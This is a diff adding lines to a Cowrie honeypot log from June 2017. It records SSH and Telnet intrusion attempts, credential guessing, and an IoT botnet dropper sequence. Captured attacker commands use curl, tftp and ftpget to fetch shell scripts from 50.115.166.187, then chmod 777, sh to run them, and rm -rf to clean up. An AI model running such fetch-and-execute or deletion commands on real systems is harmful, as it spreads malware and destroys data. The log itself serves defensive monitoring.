@@ -1516,3 +1516,96 @@
 2017-06-13T22:05:00+0000 [HoneyPotSSHTransport,27916,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
 2017-06-13T22:05:00+0000 [HoneyPotSSHTransport,27916,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
 2017-06-13T22:05:00+0000 [HoneyPotSSHTransport,27916,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-13T22:05:01+0000 [HoneyPotSSHTransport,27916,113.195.145.52] NEW KEYS
+2017-06-13T22:05:03+0000 [HTTPPageDownloader,client] Not storing duplicate content 885a24e2fa801ca7a62b0f44ccb6c5df97d9a8e58c380c1f03ce8d71f839cdf3
+2017-06-13T22:05:03+0000 [HTTPPageDownloader,client] Downloaded URL (http://50.115.166.187/fyfa.sh) with SHA-256 885a24e2fa801ca7a62b0f44ccb6c5df97d9a8e58c380c1f03ce8d71f839cdf3 to dl/885a24e2fa801ca7a62b0f44ccb6c5df97d9a8e58c380c1f03ce8d71f839cdf3
+2017-06-13T22:05:03+0000 [HTTPPageDownloader,client] Command found: curl -O http://50.115.166.187/fyfa.sh
+2017-06-13T22:05:03+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://50.115.166.187/fyfa.sh>
+2017-06-13T22:05:03+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://50.115.166.187/fyfa.sh>
+2017-06-13T22:05:03+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:26555 (10.8.41.81:2222) [session: ffbd97b1]
+2017-06-13T22:05:04+0000 [HoneyPotSSHTransport,27916,113.195.145.52] starting service 'ssh-userauth'
+2017-06-13T22:05:04+0000 [CowrieTelnetTransport,50924,45.76.171.177] Connection lost after 75 seconds
+2017-06-13T22:05:04+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,27916,113.195.145.52] 'root' trying auth 'none'
+2017-06-13T22:05:06+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,27916,113.195.145.52] 'root' authenticated with 'none'
+2017-06-13T22:05:06+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,27916,113.195.145.52] starting service 'ssh-connection'
+2017-06-13T22:05:06+0000 [HoneyPotSSHTransport,27917,113.195.145.52] Remote SSH version: SSH-2.0-PUTTY
+2017-06-13T22:05:06+0000 [HoneyPotSSHTransport,27917,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-13T22:05:06+0000 [HoneyPotSSHTransport,27917,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-13T22:05:06+0000 [HoneyPotSSHTransport,27917,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-13T22:05:06+0000 [HTTPPageDownloader,client] Not storing duplicate content 885a24e2fa801ca7a62b0f44ccb6c5df97d9a8e58c380c1f03ce8d71f839cdf3
+2017-06-13T22:05:06+0000 [HTTPPageDownloader,client] Downloaded URL (http://50.115.166.187/fyfa.sh) with SHA-256 885a24e2fa801ca7a62b0f44ccb6c5df97d9a8e58c380c1f03ce8d71f839cdf3 to dl/885a24e2fa801ca7a62b0f44ccb6c5df97d9a8e58c380c1f03ce8d71f839cdf3
+2017-06-13T22:05:06+0000 [HTTPPageDownloader,client] Command found: chmod 777 /tmp/fyfa.sh
+2017-06-13T22:05:06+0000 [HTTPPageDownloader,client] Command found: sh /tmp/fyfa.sh
+2017-06-13T22:05:06+0000 [HTTPPageDownloader,client] Command found: tftp 50.115.166.187 -c get tfyfa.sh
+2017-06-13T22:05:06+0000 [HTTPPageDownloader,client] Command found: chmod 777 tfyfa.sh
+2017-06-13T22:05:06+0000 [HTTPPageDownloader,client] Command found: sh tfyfa.sh
+2017-06-13T22:05:06+0000 [HTTPPageDownloader,client] Command found: tftp -r tfyfa2.sh -g 50.115.166.187
+2017-06-13T22:05:06+0000 [HTTPPageDownloader,client] Command found: chmod 777 tfyfa2.sh
+2017-06-13T22:05:06+0000 [HTTPPageDownloader,client] Command found: sh tfyfa2.sh
+2017-06-13T22:05:06+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 50.115.166.187 ftp1.sh ftp1.sh
+2017-06-13T22:05:06+0000 [HTTPPageDownloader,client] FTP connect failed: host=50.115.166.187, port=21, err=[Errno 111] Connection refused
+2017-06-13T22:05:06+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-06-13T22:05:06+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/fyfa.sh tfyfa.sh tfyfa2.sh ftp1.sh
+2017-06-13T22:05:06+0000 [HTTPPageDownloader,client] Command found: rm -rf *
+2017-06-13T22:05:06+0000 [HTTPPageDownloader,client] Command found: /bin/busybox cat /proc/mounts; /bin/busybox ECCHI
+2017-06-13T22:05:06+0000 [HTTPPageDownloader,client] Command found: cat /proc/mounts; /bin/busybox ECCHI
+2017-06-13T22:05:06+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://50.115.166.187/fyfa.sh>
+2017-06-13T22:05:06+0000 [HoneyPotSSHTransport,27916,113.195.145.52] Got remote error, code 11
+	reason: 
+2017-06-13T22:05:06+0000 [HoneyPotSSHTransport,27917,113.195.145.52] NEW KEYS
+2017-06-13T22:05:06+0000 [HoneyPotSSHTransport,27916,113.195.145.52] avatar root logging out
+2017-06-13T22:05:06+0000 [HoneyPotSSHTransport,27916,113.195.145.52] connection lost
+2017-06-13T22:05:06+0000 [HoneyPotSSHTransport,27916,113.195.145.52] Connection lost after 6 seconds
+2017-06-13T22:05:11+0000 [HoneyPotSSHTransport,27917,113.195.145.52] starting service 'ssh-userauth'
+2017-06-13T22:05:11+0000 [HoneyPotSSHTransport,27917,113.195.145.52] Got remote error, code 11
+	reason: 
+2017-06-13T22:05:11+0000 [HoneyPotSSHTransport,27917,113.195.145.52] connection lost
+2017-06-13T22:05:11+0000 [HoneyPotSSHTransport,27917,113.195.145.52] Connection lost after 8 seconds
+2017-06-13T22:05:12+0000 [CowrieTelnetTransport,50926,45.76.171.177] Connection lost after 79 seconds
+2017-06-13T22:05:17+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:29123 (10.8.41.81:2222) [session: a6d6c28f]
+2017-06-13T22:05:22+0000 [HoneyPotSSHTransport,27918,113.195.145.52] Remote SSH version: SSH-2.0-PUTTY
+2017-06-13T22:05:22+0000 [HoneyPotSSHTransport,27918,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-13T22:05:22+0000 [HoneyPotSSHTransport,27918,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-13T22:05:22+0000 [HoneyPotSSHTransport,27918,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-13T22:05:22+0000 [HoneyPotSSHTransport,27918,113.195.145.52] connection lost
+2017-06-13T22:05:22+0000 [HoneyPotSSHTransport,27918,113.195.145.52] Connection lost after 5 seconds
+2017-06-13T22:05:26+0000 [CowrieTelnetTransport,50927,45.76.171.177] Connection lost after 73 seconds
+2017-06-13T22:05:29+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:31483 (10.8.41.81:2222) [session: 80f9d5ee]
+2017-06-13T22:05:34+0000 [CowrieTelnetTransport,50928,45.76.171.177] Connection lost after 81 seconds
+2017-06-13T22:05:34+0000 [HoneyPotSSHTransport,27919,113.195.145.52] Got remote error, code 11
+	reason: 
+2017-06-13T22:05:34+0000 [HoneyPotSSHTransport,27919,113.195.145.52] connection lost
+2017-06-13T22:05:34+0000 [HoneyPotSSHTransport,27919,113.195.145.52] Connection lost after 4 seconds
+2017-06-13T22:05:44+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 45.33.15.6:40454 (10.8.41.81:2223) [session: TT50930]
+2017-06-13T22:05:45+0000 [CowrieTelnetTransport,50930,45.33.15.6] Connection lost after 1 seconds
+2017-06-13T22:05:47+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:11934 (10.8.41.81:2222) [session: a0adf554]
+2017-06-13T22:05:50+0000 [HoneyPotSSHTransport,27920,113.195.145.52] Remote SSH version: SSH-2.0-PUTTY
+2017-06-13T22:05:50+0000 [HoneyPotSSHTransport,27920,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-13T22:05:50+0000 [HoneyPotSSHTransport,27920,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-13T22:05:50+0000 [HoneyPotSSHTransport,27920,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-13T22:05:50+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 45.76.171.177:59401 (10.8.41.81:2223) [session: TT50931]
+2017-06-13T22:05:51+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 45.76.171.177:40835 (10.8.41.81:2223) [session: TT50932]
+2017-06-13T22:05:53+0000 [HoneyPotSSHTransport,27920,113.195.145.52] connection lost
+2017-06-13T22:05:53+0000 [HoneyPotSSHTransport,27920,113.195.145.52] Connection lost after 5 seconds
+2017-06-13T22:05:56+0000 [CowrieTelnetTransport,50931,45.76.171.177] login attempt: 89
+2017-06-13T22:05:56+0000 [CowrieTelnetTransport,50931,45.76.171.177] login return, expect: [admin/meinsm]
+2017-06-13T22:05:58+0000 [CowrieTelnetTransport,50931,45.76.171.177] login attempt [admin/] failed
+2017-06-13T22:05:58+0000 [CowrieTelnetTransport,50931,45.76.171.177] Warning: state changed and new state returned
+2017-06-13T22:05:58+0000 [CowrieTelnetTransport,50932,45.76.171.177] login attempt: 90
+2017-06-13T22:05:58+0000 [CowrieTelnetTransport,50932,45.76.171.177] login return, expect: [admin/meinsm]
+2017-06-13T22:06:01+0000 [CowrieTelnetTransport,50932,45.76.171.177] login attempt [admin/5up] failed
+2017-06-13T22:06:01+0000 [CowrieTelnetTransport,50932,45.76.171.177] Warning: state changed and new state returned
+2017-06-13T22:06:01+0000 [CowrieTelnetTransport,50929,45.76.171.177] Not storing duplicate content 885a24e2fa801ca7a62b0f44ccb6c5df97d9a8e58c380c1f03ce8d71f839cdf3
+2017-06-13T22:06:01+0000 [CowrieTelnetTransport,50929,45.76.171.177] Saved redir contents with SHA-256 885a24e2fa801ca7a62b0f44ccb6c5df97d9a8e58c380c1f03ce8d71f839cdf3 to dl/885a24e2fa801ca7a62b0f44ccb6c5df97d9a8e58c380c1f03ce8d71f839cdf3
+2017-06-13T22:06:01+0000 [CowrieTelnetTransport,50929,45.76.171.177] Not storing duplicate content 885a24e2fa801ca7a62b0f44ccb6c5df97d9a8e58c380c1f03ce8d71f839cdf3
+2017-06-13T22:06:01+0000 [CowrieTelnetTransport,50929,45.76.171.177] Saved redir contents with SHA-256 885a24e2fa801ca7a62b0f44ccb6c5df97d9a8e58c380c1f03ce8d71f839cdf3 to dl/885a24e2fa801ca7a62b0f44ccb6c5df97d9a8e58c380c1f03ce8d71f839cdf3
+2017-06-13T22:06:01+0000 [CowrieTelnetTransport,50929,45.76.171.177] Not storing duplicate content 885a24e2fa801ca7a62b0f44ccb6c5df97d9a8e58c380c1f03ce8d71f839cdf3
+2017-06-13T22:06:01+0000 [CowrieTelnetTransport,50929,45.76.171.177] Saved redir contents with SHA-256 885a24e2fa801ca7a62b0f44ccb6c5df97d9a8e58c380c1f03ce8d71f839cdf3 to dl/885a24e2fa801ca7a62b0f44ccb6c5df97d9a8e58c380c1f03ce8d71f839cdf3
+2017-06-13T22:06:01+0000 [CowrieTelnetTransport,50929,45.76.171.177] Not storing duplicate content 885a24e2fa801ca7a62b0f44ccb6c5df97d9a8e58c380c1f03ce8d71f839cdf3
+2017-06-13T22:06:01+0000 [CowrieTelnetTransport,50929,45.76.171.177] Saved redir contents with SHA-256 885a24e2fa801ca7a62b0f44ccb6c5df97d9a8e58c380c1f03ce8d71f839cdf3 to dl/885a24e2fa801ca7a62b0f44ccb6c5df97d9a8e58c380c1f03ce8d71f839cdf3
+2017-06-13T22:06:01+0000 [CowrieTelnetTransport,50929,45.76.171.177] Closing TTY Log: log/tty/20170613-220450-None-50929i.log after 70 seconds
+2017-06-13T22:06:01+0000 [CowrieTelnetTransport,50929,45.76.171.177] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-13T22:06:01+0000 [CowrieTelnetTransport,50929,45.76.171.177] Connection lost after 78 seconds
+2017-06-13T22:06:01+0000 [CowrieTelnetTransport,50931,45.76.171.177] login attempt: 91
+2017-06-13T22:06:01+0000 [CowrieTelnetTransport,50931,45.76.171.177] login return, expect: [admin/meinsm]
